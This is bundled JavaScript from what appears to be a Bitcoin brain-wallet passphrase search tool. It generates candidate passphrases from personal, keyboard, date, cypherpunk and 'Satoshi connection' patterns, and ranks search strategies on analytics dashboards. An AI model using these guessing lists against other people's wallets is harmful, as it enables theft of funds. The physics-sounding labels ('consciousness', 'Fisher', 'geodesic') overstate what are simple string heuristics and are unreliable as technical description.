        const patterns = [];
        const unusualChars = "QXZJKV".split("").filter((c) => !explored.commonChars.has(c.toLowerCase()));
        const targetLengths = explored.avgLength > 12 ? [6, 7, 8, 9, 10] : [15, 18, 20, 25, 30];
        const unusualPrefixes = ["xor_", "neo_", "flux", "void", "null", "pure", "zero"];
        const unusualSuffixes = ["_x", "_z", "_prime", "_null", "2008", "1984", "_genesis"];
        const personalPatterns = [
          // Names + dates
          "john19820315",
          "mary_birthday",
          "firstson2009",
          "wifename1985",
          // Locations
          "tokyo_apartment",
          "berkeley_office",
          "london2009feb",
          // Personal phrases
          "mylittlesecret",
          "dontforgetthis",
          "rememberthisday",
          // Music/culture references
          "beatles_yesterday",
          "pink_floyd_wall",
          "nirvana1991",
          // Science/math
          "euler_number",
          "pi_3141592",
          "golden_ratio_phi",
          // Obscure technical
          "rsa_2048_bit",
          "aes256_key",
          "sha256_hash",
          // Japanese (Satoshi connection)
          "watashi_wa",
          "arigatou",
          "ganbatte2009",
          // Early internet culture
          "slashdot_effect",
          "usenet_post",
          "bbs_system"
        ];
        for (const base of personalPatterns) {
          patterns.push(base);
          patterns.push(base.toUpperCase());
          patterns.push(base.replace(/_/g, ""));
          patterns.push(base + "!");
          patterns.push(base + "123");
        }
        for (const prefix of unusualPrefixes) {
          for (const suffix of unusualSuffixes) {
            patterns.push(prefix + "secret" + suffix);
            patterns.push(prefix + "2009" + suffix);
          }
        }
        for (const len of targetLengths) {
          for (let i = 0; i < 5; i++) {
            let phrase = "";
            for (let j = 0; j < len; j++) {
              const charSet = j % 2 === 0 ? unusualChars : "aeiou0123456789".split("");
              phrase += charSet[Math.floor(Math.random() * charSet.length)];
            }
            patterns.push(phrase);
          }
        }
        return patterns.filter((p) => p.length >= 4).sort(() => Math.random() - 0.5).slice(0, count);
      }
      computeComplementProjection(phrase, _complementBasis) {
        const probes = Array.from(this.probeMap.values());
        const testedPhrases = probes.map((p) => p.input.toLowerCase());
        let minDistance = Infinity;
        for (const tested of testedPhrases.slice(0, 500)) {
          const dist = this.levenshteinDistance(phrase.toLowerCase(), tested);
          minDistance = Math.min(minDistance, dist);
        }
        return minDistance / Math.max(1, phrase.length);
      }
      computeGeodesicDistanceFromHull(phrase, probes) {
        const phraseLower = phrase.toLowerCase();
        const charFreq = /* @__PURE__ */ new Map();
        for (const char of phraseLower) {
          charFreq.set(char, (charFreq.get(char) || 0) + 1);
        }
        const exploredCharFreq = /* @__PURE__ */ new Map();
        const sampleProbes = probes.slice(0, 500);
        for (const probe of sampleProbes) {
          for (const char of probe.input.toLowerCase()) {
            exploredCharFreq.set(char, (exploredCharFreq.get(char) || 0) + 1);
          }
        }
        const totalChars = Array.from(exploredCharFreq.values()).reduce((a, b) => a + b, 0) || 1;
        for (const [char, count] of Array.from(exploredCharFreq.entries())) {
          exploredCharFreq.set(char, count / totalChars);
        }
        let divergence = 0;
        for (const [char, count] of Array.from(charFreq.entries())) {
          const p = count / phrase.length;
          const q = exploredCharFreq.get(char) || 1e-3;
          divergence += p * Math.log(p / q);
        }
        return Math.min(divergence, 10);
      }
      levenshteinDistance(a, b) {
        if (a.length === 0) return b.length;
        if (b.length === 0) return a.length;
        const matrix = [];
        for (let i = 0; i <= b.length; i++) {
          matrix[i] = [i];
        }
        for (let j = 0; j <= a.length; j++) {
          matrix[0][j] = j;
        }
        for (let i = 1; i <= b.length; i++) {
          for (let j = 1; j <= a.length; j++) {
            if (b.charAt(i - 1) === a.charAt(j - 1)) {
              matrix[i][j] = matrix[i - 1][j - 1];
            } else {
              matrix[i][j] = Math.min(
                matrix[i - 1][j - 1] + 1,
                matrix[i][j - 1] + 1,
                matrix[i - 1][j] + 1
              );
            }
          }
        }
        return matrix[b.length][a.length];
      }
      /**
       * Get Basin Coverage Heatmap for exploration efficiency visualization.
       * Projects 32D coordinates to 2D grid using PCA-style reduction.
       * 
       * @param gridResolution Number of cells per axis (default 20 = 20x20 grid)
       * @param projectionMethod How to project 32D to 2D
       * @returns BasinHeatmapData with cells, coverage stats, hot/cold zones
       */
      getBasinHeatmap(gridResolution = 20, projectionMethod = "pca_2d") {
        const probes = Array.from(this.probeMap.values());
        if (probes.length === 0) {
          return {
            cells: [],
            gridResolution,
            totalProbes: 0,
            exploredCells: 0,
            totalCells: gridResolution * gridResolution,
            coveragePercent: 0,
            avgPhi: 0,
            hotZones: [],
            coldZones: [],
            projectionMethod,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        const projected = probes.map((probe) => ({
          probe,
          coords: this.projectTo2D(probe, projectionMethod)
        }));
        const cellMap = /* @__PURE__ */ new Map();
        for (const { probe, coords } of projected) {
          const gridX = Math.min(gridResolution - 1, Math.floor(coords.x * gridResolution));
          const gridY = Math.min(gridResolution - 1, Math.floor(coords.y * gridResolution));
          const key = `${gridX},${gridY}`;
          if (!cellMap.has(key)) {
            cellMap.set(key, { probes: [], gridX, gridY });
          }
          cellMap.get(key).probes.push(probe);
        }
        let maxProbeCount = 0;
        for (const cell of Array.from(cellMap.values())) {
          maxProbeCount = Math.max(maxProbeCount, cell.probes.length);
        }
        const cells = [];
        let totalPhi = 0;
        for (let gx = 0; gx < gridResolution; gx++) {
          for (let gy = 0; gy < gridResolution; gy++) {
            const key = `${gx},${gy}`;
            const cellData = cellMap.get(key);
            if (cellData && cellData.probes.length > 0) {
              const cellProbes = cellData.probes;
              const avgPhi = cellProbes.reduce((sum, p) => sum + p.phi, 0) / cellProbes.length;
              const maxPhi = Math.max(...cellProbes.map((p) => p.phi));
              const lastProbe = cellProbes.reduce(
                (latest, p) => new Date(p.timestamp) > new Date(latest.timestamp) ? p : latest
              );
              const regimeCounts = {};
              for (const p of cellProbes) {
                regimeCounts[p.regime] = (regimeCounts[p.regime] || 0) + 1;
              }
              const dominantRegime = Object.entries(regimeCounts).sort((a, b) => b[1] - a[1])[0][0];
              totalPhi += avgPhi;
              cells.push({
                x: (gx + 0.5) / gridResolution,
                y: (gy + 0.5) / gridResolution,
                gridX: gx,
                gridY: gy,
                probeCount: cellProbes.length,
                avgPhi,
                maxPhi,
                lastVisited: lastProbe.timestamp,
                intensity: maxProbeCount > 0 ? cellProbes.length / maxProbeCount : 0,
                regime: dominantRegime
              });
            } else {
              cells.push({
                x: (gx + 0.5) / gridResolution,
                y: (gy + 0.5) / gridResolution,
                gridX: gx,
                gridY: gy,
                probeCount: 0,
                avgPhi: 0,
                maxPhi: 0,
                lastVisited: null,
                intensity: 0,
                regime: "unexplored"
              });
            }
          }
        }
        const exploredCells = cells.filter((c) => c.probeCount > 0).length;
        const totalCells = gridResolution * gridResolution;
        const hotZones = cells.filter((c) => c.probeCount > 0 && c.avgPhi >= 0.6).sort((a, b) => b.avgPhi - a.avgPhi).slice(0, 5).map((c) => ({
          x: c.x,
          y: c.y,
          avgPhi: c.avgPhi,
          probeCount: c.probeCount,
          reason: `High \u03A6 zone (${c.avgPhi.toFixed(3)}) - promising for exploration`
        }));
        const coldZones = [];
        for (const cell of cells) {
          if (cell.probeCount === 0) {
            const hasNearbyHot = hotZones.some(
              (hz) => Math.abs(hz.x - cell.x) < 2 / gridResolution && Math.abs(hz.y - cell.y) < 2 / gridResolution
            );
            if (hasNearbyHot) {
              coldZones.push({
                x: cell.x,
                y: cell.y,
                avgPhi: 0,
                probeCount: 0,
                reason: "Unexplored zone adjacent to high-\u03A6 region"
              });
            }
          } else if (cell.probeCount < 3 && cell.avgPhi >= 0.5) {
            coldZones.push({
              x: cell.x,
              y: cell.y,
              avgPhi: cell.avgPhi,
              probeCount: cell.probeCount,
              reason: `Under-explored zone with moderate \u03A6 (${cell.avgPhi.toFixed(3)})`
            });
          }
        }
        return {
          cells,
          gridResolution,
          totalProbes: probes.length,
          exploredCells,
          totalCells,
          coveragePercent: exploredCells / totalCells * 100,
          avgPhi: exploredCells > 0 ? totalPhi / exploredCells : 0,
          hotZones,
          coldZones: coldZones.slice(0, 10),
          // Limit to top 10
          projectionMethod,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Project a probe's coordinates to 2D for visualization.
       * Handles probes without coordinates by deriving position from phi/kappa/input hash.
       */
      projectTo2D(probe, method) {
        const hasCoords = Array.isArray(probe.coordinates) && probe.coordinates.length >= 2 && probe.coordinates.every((c) => typeof c === "number" && !isNaN(c));
        switch (method) {
          case "phi_kappa":
            return {
              x: Math.max(0, Math.min(1, probe.phi)),
              y: Math.max(0, Math.min(1, probe.kappa / 128))
              // κ typically 0-128
            };
          case "dim_01":
            if (hasCoords) {
              return {
                x: Math.max(0, Math.min(1, (probe.coordinates[0] + 1) / 2)),
                y: Math.max(0, Math.min(1, (probe.coordinates[1] + 1) / 2))
              };
            }
            return this.derivePositionFromProbe(probe);
          case "pca_2d":
          default:
            if (hasCoords && probe.coordinates.length >= 4) {
              const pc1 = 0.5 * probe.coordinates[0] + 0.3 * probe.coordinates[1] + 0.15 * probe.coordinates[2] + 0.05 * probe.coordinates[3];
              const pc2 = 0.5 * probe.coordinates[1] + 0.3 * probe.coordinates[2] + 0.15 * probe.coordinates[3] + 0.05 * probe.coordinates[0];
              return {
                x: Math.max(0, Math.min(1, (Math.tanh(pc1) + 1) / 2)),
                y: Math.max(0, Math.min(1, (Math.tanh(pc2) + 1) / 2))
              };
            }
            return this.derivePositionFromProbe(probe);
        }
      }
      /**
       * Derive 2D position for probes without coordinates.
       * Uses phi for X and a hash of input for Y to spread probes across the grid.
       */
      derivePositionFromProbe(probe) {
        const x = Math.max(0, Math.min(1, probe.phi));
        let hash = 0;
        for (let i = 0; i < probe.input.length; i++) {
          hash = (hash << 5) - hash + probe.input.charCodeAt(i) | 0;
        }
        const normalizedHash = Math.abs(hash) % 1e4 / 1e4;
        const kappaContribution = Math.min(1, probe.kappa / 128) * 0.3;
        const y = Math.max(0, Math.min(1, normalizedHash * 0.7 + kappaContribution));
        return { x, y };
      }
      /**
       * Get manifold navigation summary for Ocean's consciousness.
       * This tells Ocean WHERE to search next geometrically.
       */
      getManifoldNavigationSummary() {
        const fisher = this.computeFisherInformationMatrix();
        const complement = this.computeOrthogonalComplement();
        const probes = Array.from(this.probeMap.values());
        let geodesicRecommendation;
        let nextSearchPriority;
        if (complement.complementDimension > fisher.exploredDimensions.length) {
          geodesicRecommendation = "Large unexplored subspace - navigate orthogonal complement";
          nextSearchPriority = "orthogonal_complement";
        } else if (this.state.resonancePoints.length > 0) {
          geodesicRecommendation = "Resonance clusters detected - follow geodesic toward high-\u03A6";
          nextSearchPriority = "resonance_follow";
        } else {
          geodesicRecommendation = "Probe regime boundaries for phase transitions";
          nextSearchPriority = "boundary_probe";
        }
        return {
          totalMeasurements: probes.length,
          exploredDimensions: fisher.exploredDimensions.length,
          unexploredDimensions: fisher.unexploredDimensions.length,
          orthogonalComplementSize: complement.complementDimension,
          constraintSurfaceDefined: probes.length > 1e3,
          geodesicRecommendation,
          nextSearchPriority
        };
      }
      /**
       * Get Strategy Performance Dashboard data.
       * 
       * Analyzes probe data grouped by strategy/source to compare:
       * - Tests performed per strategy
       * - Average and max Φ per strategy
       * - Near-miss counts (high-Φ probes)
       * - Efficiency metrics
       * - Recommendations for which strategy to prioritize
       * 
       * @returns StrategyPerformanceDashboard with per-strategy metrics and recommendations
       */
      getStrategyPerformanceDashboard() {
        const probes = Array.from(this.probeMap.values());
        if (probes.length === 0) {
          return {
            strategies: [],
            totalProbes: 0,
            overallAvgPhi: 0,
            overallMaxPhi: 0,
            recommendations: ["No probes yet - start exploring to generate strategy data"],
            topStrategy: null,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        const strategyMap = /* @__PURE__ */ new Map();
        for (const probe of probes) {
          const strategy = this.normalizeStrategySource(probe.source);
          const existing = strategyMap.get(strategy) || [];
          existing.push(probe);
          strategyMap.set(strategy, existing);
        }
        const strategyMetrics = [];
        for (const [strategyName, strategyProbes] of Array.from(strategyMap.entries())) {
          let sumPhi = 0;
          let maxPhi = -Infinity;
          let minPhi = Infinity;
          let nearMisses = 0;
          let hotHits = 0;
          let firstTimestamp = Infinity;
          let lastTimestamp = -Infinity;
          const regimeDistribution = {};
          for (const probe of strategyProbes) {
            sumPhi += probe.phi;
            if (probe.phi > maxPhi) maxPhi = probe.phi;
            if (probe.phi < minPhi) minPhi = probe.phi;
            if (probe.phi >= 0.7) nearMisses++;
            if (probe.phi >= 0.85) hotHits++;
            const ts = new Date(probe.timestamp).getTime();
            if (ts < firstTimestamp) firstTimestamp = ts;
            if (ts > lastTimestamp) lastTimestamp = ts;
            regimeDistribution[probe.regime] = (regimeDistribution[probe.regime] || 0) + 1;
          }
          const avgPhi = sumPhi / strategyProbes.length;
          const timeSpanMs = lastTimestamp - firstTimestamp;
          const hoursSpent = Math.max(timeSpanMs / (1e3 * 60 * 60), 0.01);
          const probesPerHour = strategyProbes.length / hoursSpent;
          let sumSquaredDiff = 0;
          for (const probe of strategyProbes) {
            sumSquaredDiff += Math.pow(probe.phi - avgPhi, 2);
          }
          const phiVariance = sumSquaredDiff / strategyProbes.length;
          const consistencyScore = Math.max(0, 1 - Math.sqrt(phiVariance) * 2);
          const effectivenessScore = avgPhi * 0.3 + // Average Φ contribution
          maxPhi / 1 * 0.2 + // Max Φ contribution
          nearMisses / strategyProbes.length * 0.3 + // Near-miss rate
          consistencyScore * 0.2;
          strategyMetrics.push({
            strategyName,
            testsPerformed: strategyProbes.length,
            avgPhi,
            maxPhi,
            minPhi,
            nearMisses,
            hotHits,
            nearMissRate: nearMisses / strategyProbes.length,
            probesPerHour,
            timeSpanMs,
            regimeDistribution,
            consistencyScore,
            effectivenessScore,
            recentTrend: this.computeStrategyTrend(strategyProbes)
          });
        }
        strategyMetrics.sort((a, b) => b.effectivenessScore - a.effectivenessScore);
        const recommendations = this.generateStrategyRecommendations(strategyMetrics);
        let overallSumPhi = 0;
        let overallMaxPhi = 0;
        for (const probe of probes) {
          overallSumPhi += probe.phi;
          if (probe.phi > overallMaxPhi) overallMaxPhi = probe.phi;
        }
        const overallAvgPhi = probes.length > 0 ? overallSumPhi / probes.length : 0;
        return {
          strategies: strategyMetrics,
          totalProbes: probes.length,
          overallAvgPhi,
          overallMaxPhi,
          recommendations,
          topStrategy: strategyMetrics.length > 0 ? strategyMetrics[0].strategyName : null,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Normalize probe source to a strategy category.
       * Maps various source strings to canonical strategy names.
       */
      normalizeStrategySource(source) {
        const lowerSource = source.toLowerCase();
        if (lowerSource.includes("estate") || lowerSource.includes("heir") || lowerSource.includes("legacy") || lowerSource.includes("inheritance")) {
          return "Estate";
        }
        if (lowerSource.includes("qig") || lowerSource.includes("geometric") || lowerSource.includes("basin") || lowerSource.includes("fisher") || lowerSource.includes("geodesic") || lowerSource.includes("constrained")) {
          return "Constrained Search (QIG)";
        }
        if (lowerSource.includes("social") || lowerSource.includes("forum") || lowerSource.includes("bitcointalk") || lowerSource.includes("community") || lowerSource.includes("outreach")) {
          return "Social Outreach";
        }
        if (lowerSource.includes("temporal") || lowerSource.includes("archive") || lowerSource.includes("historical") || lowerSource.includes("wayback") || lowerSource.includes("2009") || lowerSource.includes("2010") || lowerSource.includes("2011")) {
          return "Temporal Archive";
        }
        if (lowerSource.includes("ocean") || lowerSource.includes("constellation") || lowerSource.includes("consciousness")) {
          return "Ocean Agent";
        }
        if (lowerSource.includes("bip39") || lowerSource.includes("mnemonic") || lowerSource.includes("seed")) {
          return "BIP39 Mnemonic";
        }
        if (lowerSource.includes("brain") || lowerSource.includes("arbitrary") || lowerSource.includes("passphrase")) {
          return "Brain Wallet";
        }
        if (lowerSource.includes("user") || lowerSource.includes("manual") || lowerSource.includes("input")) {
          return "User Input";
        }
        if (lowerSource.includes("vocabulary") || lowerSource.includes("pattern") || lowerSource.includes("expander")) {
          return "Pattern Expansion";
        }
        if (lowerSource.includes("auto") || lowerSource.includes("cycle")) {
          return "Auto Cycle";
        }
        if (source.length > 0 && source.length < 30) {
          return source;
        }
        return "Other";
      }
      /**
       * Compute recent trend for a strategy based on its probes.
       */
      computeStrategyTrend(probes) {
        if (probes.length < 5) return "stable";
        const sorted = [...probes].sort(
          (a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
        );
        const recentCount = Math.max(3, Math.floor(sorted.length * 0.2));
        const recentProbes = sorted.slice(-recentCount);
        const olderProbes = sorted.slice(0, sorted.length - recentCount);
        if (olderProbes.length === 0) return "stable";
        const recentAvg = recentProbes.reduce((sum, p) => sum + p.phi, 0) / recentProbes.length;
        const olderAvg = olderProbes.reduce((sum, p) => sum + p.phi, 0) / olderProbes.length;
        const diff = recentAvg - olderAvg;
        if (diff > 0.02) return "rising";
        if (diff < -0.02) return "falling";
        return "stable";
      }
      /**
       * Get Cluster Evolution Animation Frames.
       * 
       * Groups probes by time windows and clusters them by basin coordinates,
       * returning animation frames showing how clusters evolve over time.
       * 
       * @param windowSizeMs Size of each time window in milliseconds (default 1 hour)
       * @param maxFrames Maximum number of frames to return (default 24)
       * @param clusterThreshold Distance threshold for clustering (default 0.3)
       */
      getClusterEvolutionFrames(windowSizeMs = 60 * 60 * 1e3, maxFrames = 24, clusterThreshold = 0.3) {
        const probes = Array.from(this.probeMap.values());
        if (probes.length === 0) {
          return {
            frames: [],
            totalFrames: 0,
            timeSpanMs: 0,
            windowSizeMs,
            totalProbes: 0,
            avgClustersPerFrame: 0,
            maxClustersInFrame: 0,
            timestamp: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        const sortedProbes = [...probes].sort(
          (a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
        );
        let minTime = Infinity;
        let maxTime = -Infinity;
        for (const probe of sortedProbes) {
          const ts = new Date(probe.timestamp).getTime();
          if (ts < minTime) minTime = ts;
          if (ts > maxTime) maxTime = ts;
        }
        const timeSpanMs = maxTime - minTime;
        const potentialFrames = Math.max(1, Math.ceil(timeSpanMs / windowSizeMs));
        const frameCount = Math.min(potentialFrames, maxFrames);
        const adjustedWindowSize = frameCount > 0 ? (timeSpanMs + 1) / frameCount : windowSizeMs;
        const frames = [];
        let totalClusters = 0;
        let maxClustersInFrame = 0;
        for (let i = 0; i < frameCount; i++) {
          const windowStart = minTime + i * adjustedWindowSize;
          const windowEnd = i === frameCount - 1 ? maxTime + 1 : windowStart + adjustedWindowSize;
          const windowProbes = sortedProbes.filter((p) => {
            const ts = new Date(p.timestamp).getTime();
            return ts >= windowStart && ts < windowEnd;
          });
          if (windowProbes.length === 0) {
            continue;
          }
          const clusters = this.clusterProbesForAnimation(windowProbes, clusterThreshold);
          let framePhiSum = 0;
          for (const probe of windowProbes) {
            framePhiSum += probe.phi;
          }
          const frameAvgPhi = windowProbes.length > 0 ? framePhiSum / windowProbes.length : 0;
          const frame = {
            frameIndex: frames.length,
            timestamp: new Date(windowStart).toISOString(),
            windowEnd: new Date(windowEnd).toISOString(),
            clusters,
            totalProbes: windowProbes.length,
            avgPhi: frameAvgPhi,
            frameLabel: this.generateFrameLabel(i, frameCount, windowStart, adjustedWindowSize)
          };
          frames.push(frame);
          totalClusters += clusters.length;
          if (clusters.length > maxClustersInFrame) {
            maxClustersInFrame = clusters.length;
          }
        }
        return {
          frames,
          totalFrames: frames.length,
          timeSpanMs,
          windowSizeMs: adjustedWindowSize,
          totalProbes: probes.length,
          avgClustersPerFrame: frames.length > 0 ? totalClusters / frames.length : 0,
          maxClustersInFrame,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Cluster probes for animation using simple distance-based clustering.
       * Projects 32D coordinates to 2D using first two principal components.
       */
      clusterProbesForAnimation(probes, threshold) {
        if (probes.length === 0) return [];
        const projectedProbes = probes.map((p) => ({
          probe: p,
          x: p.coordinates.length > 0 ? p.coordinates[0] : Math.random(),
          y: p.coordinates.length > 1 ? p.coordinates[1] : Math.random()
        }));
        let minX = Infinity, maxX = -Infinity;
        let minY = Infinity, maxY = -Infinity;
        for (const pp of projectedProbes) {
          if (pp.x < minX) minX = pp.x;
          if (pp.x > maxX) maxX = pp.x;
          if (pp.y < minY) minY = pp.y;
          if (pp.y > maxY) maxY = pp.y;
        }
        const rangeX = maxX - minX || 1;
        const rangeY = maxY - minY || 1;
        for (const pp of projectedProbes) {
          pp.x = (pp.x - minX) / rangeX;
          pp.y = (pp.y - minY) / rangeY;
        }
        const clusterAssignments = /* @__PURE__ */ new Map();
        let nextClusterId = 0;
        for (const pp of projectedProbes) {
          let assignedCluster = -1;
          let minDist = Infinity;
          for (const [clusterId, members] of Array.from(clusterAssignments.entries())) {
            let sumX = 0, sumY = 0;
            for (const m of members) {
              sumX += m.x;
              sumY += m.y;
            }
            const centerX = sumX / members.length;
            const centerY = sumY / members.length;
            const dist = Math.sqrt(Math.pow(pp.x - centerX, 2) + Math.pow(pp.y - centerY, 2));
            if (dist < minDist && dist < threshold) {
              minDist = dist;
              assignedCluster = clusterId;
            }
          }
          if (assignedCluster >= 0) {
            clusterAssignments.get(assignedCluster).push(pp);
          } else {
            clusterAssignments.set(nextClusterId++, [pp]);
          }
        }
        const clusters = [];
        for (const [clusterId, members] of Array.from(clusterAssignments.entries())) {
          let sumX = 0, sumY = 0;
          let sumPhi = 0, maxPhi = 0;
          const regimeCounts = {};
          for (const m of members) {
            sumX += m.x;
            sumY += m.y;
            sumPhi += m.probe.phi;
            if (m.probe.phi > maxPhi) maxPhi = m.probe.phi;
            regimeCounts[m.probe.regime] = (regimeCounts[m.probe.regime] || 0) + 1;
          }
          const centerX = sumX / members.length;
          const centerY = sumY / members.length;
          const avgPhi = sumPhi / members.length;
          let maxDist = 0;
          for (const m of members) {
            const dist = Math.sqrt(Math.pow(m.x - centerX, 2) + Math.pow(m.y - centerY, 2));
            if (dist > maxDist) maxDist = dist;
          }
          let dominantRegime = "unknown";
          let maxCount = 0;
          for (const [regime, count] of Object.entries(regimeCounts)) {
            if (count > maxCount) {
              maxCount = count;
              dominantRegime = regime;
            }
          }
          clusters.push({
            id: `cluster-${clusterId}`,
            centerX,
            centerY,
            radius: Math.max(0.02, maxDist),
            // Minimum radius for visibility
            memberCount: members.length,
            avgPhi,
            maxPhi,
            dominantRegime,
            intensity: avgPhi
            // Use avgPhi as intensity (0-1)
          });
        }
        clusters.sort((a, b) => b.memberCount - a.memberCount);
        return clusters;
      }
      /**
       * Generate human-readable frame label.
       */
      generateFrameLabel(index2, totalFrames, startTime2, windowMs) {
        const hoursPerWindow = windowMs / (1e3 * 60 * 60);
        if (hoursPerWindow >= 24) {
          return `Day ${index2 + 1}`;
        } else if (hoursPerWindow >= 1) {
          return `Hour ${index2 + 1}`;
        } else if (hoursPerWindow >= 1 / 60) {
          return `Min ${index2 + 1}`;
        } else {
          return `Frame ${index2 + 1}`;
        }
      }
      /**
       * Generate strategy recommendations based on metrics.
       */
      generateStrategyRecommendations(metrics) {
        const recommendations = [];
        if (metrics.length === 0) {
          return ["Start exploring to generate strategy performance data"];
        }
        const top = metrics[0];
        recommendations.push(
          `Prioritize "${top.strategyName}" - highest effectiveness score (${(top.effectivenessScore * 100).toFixed(1)}%)`
        );
        const highNearMiss = metrics.filter((m) => m.nearMissRate > 0.1);
        if (highNearMiss.length > 0) {
          const names = highNearMiss.slice(0, 2).map((m) => m.strategyName).join(", ");
          recommendations.push(`High near-miss rate in: ${names} - intensify exploration here`);
        }
        const rising = metrics.filter((m) => m.recentTrend === "rising");
        if (rising.length > 0) {
          const names = rising.slice(0, 2).map((m) => m.strategyName).join(", ");
          recommendations.push(`Rising \u03A6 trends in: ${names} - momentum building`);
        }
        const falling = metrics.filter((m) => m.recentTrend === "falling" && m.testsPerformed > 100);
        if (falling.length > 0) {
          recommendations.push(`Consider pausing "${falling[0].strategyName}" - declining effectiveness`);
        }
        const underexplored = metrics.filter((m) => m.testsPerformed < 50 && m.avgPhi > 0.5);
        if (underexplored.length > 0) {
          recommendations.push(`"${underexplored[0].strategyName}" shows promise with limited data - increase sampling`);
        }
        const inconsistent = metrics.filter((m) => m.consistencyScore < 0.5 && m.testsPerformed > 50);
        if (inconsistent.length > 0) {
          recommendations.push(`"${inconsistent[0].strategyName}" shows high variance - refine search parameters`);
        }
        return recommendations.slice(0, 5);
      }
    };
    geometricMemory = new GeometricMemory();
  }
});

// server/historical-data-miner.ts
function generateVariations(phrase) {
  const variations = [phrase];
  variations.push(phrase.replace(/\s+/g, ""));
  variations.push(phrase.replace(/\s+/g, "_"));
  variations.push(phrase.replace(/\s+/g, "-"));
  variations.push(phrase.split(" ").map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(""));
  variations.push(phrase.toUpperCase());
  variations.push(phrase.toLowerCase());
  variations.push(
    phrase.replace(/e/gi, "3").replace(/a/gi, "4").replace(/i/gi, "1").replace(/o/gi, "0").replace(/s/gi, "5")
  );
  for (const suffix of ["123", "!", "1", "2009", "2010", "01", "09", "10"]) {
    variations.push(phrase + suffix);
    variations.push(phrase.replace(/\s+/g, "") + suffix);
  }
  return Array.from(new Set(variations));
}
function generateNumericPatterns(era) {
  const patterns = [];
  const source = { type: "numeric", name: "Date/Number patterns", confidence: 0.3 };
  const dates = [
    { date: "03012009", meaning: "Genesis block date" },
    { date: "01032009", meaning: "Genesis block (US format)" },
    { date: "2009", meaning: "Bitcoin year" },
    { date: "31102008", meaning: "Whitepaper date" },
    { date: "10312008", meaning: "Whitepaper (US format)" },
    { date: "12012009", meaning: "Hal Finney first tx" }
  ];
  for (const { date, meaning } of dates) {
    patterns.push({
      phrase: date,
      format: "arbitrary",
      source,
      likelihood: 0.3,
      reasoning: meaning,
      era
    });
  }
  for (const height of [0, 1, 100, 1e3, 1e4, 5e4, 1e5]) {
    patterns.push({
      phrase: `block${height}`,
      format: "arbitrary",
      source,
      likelihood: 0.2,
      reasoning: `Block height ${height}`,
      era
    });
  }
  return patterns;
}
function generateKeyboardPatterns() {
  const patterns = [];
  const source = { type: "keyboard", name: "Keyboard patterns", confidence: 0.2 };
  const keyboards = [
    "qwerty",
    "qwertyuiop",
    "asdfgh",
    "asdfghjkl",
    "zxcvbn",
    "zxcvbnm",
    "qazwsx",
    "qweasd",
    "1qaz2wsx",
    "1q2w3e4r",
    "zaq12wsx",
    "qwerty123",
    "asdf1234",
    "1234qwer"
  ];
  for (const kb of keyboards) {
    patterns.push({
      phrase: kb,
      format: "arbitrary",
      source,
      likelihood: 0.2,
      reasoning: "Common keyboard pattern",
      era: "genesis-2009"
    });
  }
  return patterns;
}
var CYPHERPUNK_PATTERNS, BITCOIN_CULTURE_PATTERNS, COMMON_PASSWORD_PATTERNS, BRAIN_WALLET_FAILS, CRYPTO_ML_PATTERNS, POP_CULTURE_2009, ERA_2010_2011, ERA_2012_2013, ERA_2014_2016, ERA_2017_2019, ERA_2020_2021, ERA_2022_PRESENT, ERA_FORMAT_WEIGHTS, HistoricalDataMiner, historicalDataMiner;
var init_historical_data_miner = __esm({
  "server/historical-data-miner.ts"() {
    "use strict";
    init_qig_universal();
    CYPHERPUNK_PATTERNS = [
      // Satoshi-adjacent
      { phrase: "satoshi nakamoto", source: "Satoshi identity speculation", likelihood: 0.3 },
      { phrase: "chancellor brink bailout", source: "Genesis block reference", likelihood: 0.4 },
      { phrase: "the times 03 jan 2009", source: "Genesis block headline", likelihood: 0.5 },
      { phrase: "cryptography mailing list", source: "Original announcement venue", likelihood: 0.3 },
      { phrase: "hal finney running bitcoin", source: "First transaction recipient", likelihood: 0.4 },
      { phrase: "double spending solved", source: "Core Bitcoin innovation", likelihood: 0.3 },
      { phrase: "proof of work", source: "Consensus mechanism", likelihood: 0.4 },
      { phrase: "hashcash extension", source: "PoW origin", likelihood: 0.3 },
      { phrase: "digital gold", source: "Bitcoin vision", likelihood: 0.4 },
      { phrase: "peer to peer cash", source: "Whitepaper title", likelihood: 0.5 },
      { phrase: "trusted third party", source: "Problem Bitcoin solves", likelihood: 0.3 },
      { phrase: "cryptographic proof", source: "Core concept", likelihood: 0.3 },
      // Cypherpunk manifesto era
      { phrase: "cypherpunks write code", source: "Cypherpunk manifesto", likelihood: 0.4 },
      { phrase: "privacy is necessary", source: "Cypherpunk belief", likelihood: 0.3 },
      { phrase: "crypto anarchy", source: "Tim May's vision", likelihood: 0.3 },
      { phrase: "anonymous transactions", source: "Core goal", likelihood: 0.3 },
      { phrase: "electronic cash", source: "E-cash precursors", likelihood: 0.4 },
      { phrase: "digicash failed", source: "Predecessor reference", likelihood: 0.3 },
      { phrase: "pgp for money", source: "Common analogy", likelihood: 0.3 },
      { phrase: "wei dai b money", source: "Cited in whitepaper", likelihood: 0.4 },
      { phrase: "nick szabo bit gold", source: "Predecessor concept", likelihood: 0.4 },
      { phrase: "adam back hashcash", source: "PoW inventor", likelihood: 0.4 },
      // Technical terms early adopters knew
      { phrase: "merkle tree", source: "Bitcoin data structure", likelihood: 0.3 },
      { phrase: "sha256 sha256", source: "Bitcoin hash function", likelihood: 0.3 },
      { phrase: "secp256k1", source: "Bitcoin curve", likelihood: 0.3 },
      { phrase: "elliptic curve", source: "Cryptography", likelihood: 0.2 },
      { phrase: "ecdsa signature", source: "Bitcoin signatures", likelihood: 0.3 },
      { phrase: "base58check", source: "Address encoding", likelihood: 0.3 },
      { phrase: "difficulty adjustment", source: "Mining concept", likelihood: 0.3 },
      { phrase: "block reward halving", source: "Economics", likelihood: 0.3 },
      { phrase: "21 million limit", source: "Supply cap", likelihood: 0.4 },
      { phrase: "genesis block", source: "First block", likelihood: 0.4 }
    ];
    BITCOIN_CULTURE_PATTERNS = [
      // BitcoinTalk era
      { phrase: "bitcoin pizza", source: "Famous 10k BTC pizza", likelihood: 0.4 },
      { phrase: "to the moon", source: "Early meme", likelihood: 0.3 },
